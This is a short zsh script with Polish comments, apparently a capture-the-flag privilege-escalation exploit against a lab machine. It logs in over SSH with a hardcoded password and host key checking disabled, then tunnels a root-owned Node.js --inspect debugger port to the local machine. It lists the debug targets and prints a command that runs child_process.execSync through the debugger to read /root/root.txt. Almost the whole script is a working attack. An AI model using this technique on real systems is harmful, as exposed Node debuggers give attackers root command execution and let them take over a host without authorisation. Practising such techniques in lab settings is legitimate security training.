#!/bin/zsh
# Cichszy root: tunel SSH do Node --inspect (root), bez snap/LXD na boxie
IP=10.129.245.214
PASS=reactor1
echo "[*] Tunel 127.0.0.1:9229 (root node inspect) — zostaw w tle"
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -f -N -L 9229:127.0.0.1:9229 engineer@$IP
sleep 1
echo "[*] Lista debuggerów:"
curl -s http://127.0.0.1:9229/json/list | head -c 500
echo ""
echo "[*] RCE przez Runtime (wymaga: pip install websocket-client — lub użyj poniższego pythona)"
python3 << 'PY'
import json, urllib.request
try:
    with urllib.request.urlopen('http://127.0.0.1:9229/json/list', timeout=5) as r:
        tabs = json.load(r)
    print('WS:', tabs[0].get('webSocketDebuggerUrl','?')[:80])
    print('Użyj: npx chrome-remote-interface eval "require(\"child_process\").execSync(\"cat /root/root.txt\").toString()"')
except Exception as e:
    print('Błąd:', e, '— czy tunel SSH działa?')
PY
